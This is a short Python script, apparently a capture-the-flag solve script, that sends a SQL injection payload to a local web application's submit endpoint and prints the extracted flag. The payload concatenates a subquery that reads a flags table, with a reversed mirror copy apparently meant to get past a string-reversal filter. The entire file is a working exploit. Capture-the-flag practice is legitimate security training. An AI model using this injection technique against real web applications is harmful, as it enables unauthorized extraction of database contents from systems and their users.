import re

import requests

HOST = 'http://localhost:5000'

s = requests.Session()
s.get(HOST)
flag = s.post(f'{HOST}/submit', data={'submission': "'||(select flag from flags)); -- ;))sgalf morf galf tceles(||'"}).text
print(re.search(r'hope\{[ -z|~]+\}', flag).group(0))
